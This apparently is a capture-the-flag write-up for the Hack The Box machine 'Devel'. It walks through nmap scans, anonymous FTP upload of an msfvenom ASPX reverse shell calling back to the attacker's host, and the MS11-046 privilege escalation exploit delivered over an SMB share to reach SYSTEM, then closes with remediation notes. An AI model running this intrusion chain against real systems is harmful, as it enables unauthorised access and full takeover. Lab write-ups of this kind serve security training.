+++
draft = false
date = 2020-06-25T16:04:02+01:00
title = "Devel"
description = ""
slug = ""
tags = []
categories = []
externalLink = ""
series = []
weight = 7
+++


# Machine info

- OS : Windows
- Difficulty : Easy
- Points : 20
- IP : 10.10.10.5


# Mind Map
![Devel_MindMap](/images/htb/devel_mindmap.png)


# Reconnaisance

Initial scan:

{{< highlight html >}}
sudo nmap -sT -n -O 10.10.10.5 -oA nmap/sT_scan
{{< /highlight >}}

Result:

{{< highlight html >}}
Nmap scan report for 10.10.10.5
Host is up (0.075s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
No exact OS matches for host (test conditions non-ideal).
{{< /highlight >}}


# Enumeration

I proceed visiting the page at `10.10.10.5` port `80`.

 ![Devel_MindMap](/images/htb/devel_homepage.png)

 It is a simple web page informing that the server is running Windows IIS7. For now, nothing useful here, so let's move on enumerating FTP.

 {{< highlight html >}}
 sudo nmap -sC -p 21 10.10.10.5 -n
 {{< /highlight >}}

 Where:
 - `-sC` stands for default script scan

Result:

{{< highlight html >}}
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 06-29-20  01:40PM                30442 dog.jpg
| 06-29-20  02:07PM                 2867 ex.aspx
| 03-17-17  05:37PM                  689 iisstart.htm
| 06-29-20  09:34PM                   81 test.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT

{{< /highlight >}}

The most intersting thing to note here is that **Anonymous login** is allowed! That means that If I find a way to upload a file on the web server, I will be able to execute it.

The output shows the actual resources uploaded on the web server. Indeed, if i visit `10.10.10.5/dog.png` I can see an image.

# Exploitation

Let's try to login to FTP anonymously and see if there is a way to upload a file.

{{< highlight html >}}
ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:user): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp>
{{< /highlight >}}

**Note**: The password can be anything.

We're in! At this point I want to try the file upload and check if I'm able to open it on the server side:

{{< highlight html >}}
echo " Simple test to see if IIs7 server will show a custom uploaded file. " > testfile.html
{{< /highlight >}}

**Note**: This command will create a file with the content of the echo output.

Upload the file via FTP and try to access it via web server:

{{< highlight html >}}
tp> put testfile.html
local: testfile.html remote: testfile.html
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
71 bytes sent in 0.00 secs (1.2776 MB/s)
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
06-29-20  01:40PM                30442 dog.jpg
06-29-20  02:07PM                 2867 ex.aspx
03-17-17  05:37PM                  689 iisstart.htm
06-29-20  09:51PM                   71 testfile.html
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
{{< /highlight >}}

When I visit 10.10.10.5/testfile.html I can see its content:

 ![Devel_ServerTest](/images/htb/devel_servertest.png)

 Now I want to create a **reverse shell** with msfvenom to upload on the web server. I choose a 32bit payload as it works with both 32bit and 64bit OS versions:

{{< highlight html >}}
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4321 -f aspx -o shell.aspx
{{< /highlight >}}

Where:
- `LHOST` and `LPORT` are the ip and port where I will listen on my machine
- `-f` stands for output format
- `-o` stands for output name

And upload it on the web server:

{{< highlight html >}}
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2778 bytes sent in 0.00 secs (47.3091 MB/s)
ftp>
{{< /highlight >}}

I set up a listener on port 4321 on my machine and after visiting the page at `10.10.10.5/shell.aspx` I can see the connection coming back:

{{< highlight html >}}
nc -nlvp 4321
listening on [any] 4321 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.5] 49177
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web
{{< /highlight >}}

I am connected as the **iis appool\web** user!

# Privilege Escalation

Running `systeminfo` on the machine, I can see that the OS is **Windows 7 Enterprise Build 7600**.

{{< highlight html >}}
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 733 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 1.481 MB
Virtual Memory: In Use:    566 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
{{< /highlight >}}

Searching on Google for Win7 build 7600 exploits, I find this one:

![Devel_PrivEsc](/images/htb/devel_priv_esc.png)

I can also find the exploit on `searchsploit`:

{{< highlight html >}}
searchsploit windows| grep 40564
Microsoft Windows (x86) - 'afd.sys' Local Pri | windows_x86/local/40564.c
{{< /highlight >}}
Where:
- `40564` is the **EDB-ID** of the exploit

Download it:

{{< highlight html >}}
searchsploit -m windows_x86/local/40564.c
  Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)
      URL: https://www.exploit-db.com/exploits/40564
     Path: /usr/share/exploitdb/exploits/windows_x86/local/40564.c
File Type: C source, ASCII text, with CRLF line terminators
{{< /highlight >}}

The instructions for compiling the exploit are in the file:

>Exploit compiling (Kali GNU/Linux Rolling 64-bit):

>i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32

After running the command (writing 40564.c instead of MS11-046.c), the exploit is compiled and ready to be uploaded on the target machine:

{{< highlight html >}}
sudo python3 /opt/impacket/examples/smbserver.py share .
{{< /highlight >}}

Where:
- `share` is the name I want to give to the share
- `.` is the share path

**Note**: I am setting up a smb server in order to deliver the payload, as `wget` and `curl` are not installed on the target machine. Another way could be to use a `Powershell download cradle`.

On target I place myself under `C:\Users\Public`, as here I have **write permissions** and copy the file:

{{< highlight html >}}
C:\Users\Public>copy \\10.10.14.9\share\MS11-046.exe
copy \\10.10.14.9\share\MS11-046.exe
{{< /highlight >}}

At this point I have the exploit on the target machine. I just need to launch it and gain **SYSTEM** privileges!

{{< highlight html >}}
C:\Users\Public>.\MS11-046.exe
.\MS11-046.exe

c:\Windows\System32>whoami
whoami
nt authority\system

c:\Windows\System32>
{{< /highlight >}}

**Note**: flags are under `C:\Users\babis\Desktop` and `C:\Users\Administrator\Desktop`.


## Lessons learned and remediations

- The ftp service allows **anonymous login**. The administrator should not allow this kind of behaviour as the ftp server is sharing the root directory of the web server.
- The administrator should **update / patch the software**, as the machine is running an OS version with publicly available and known exploits.
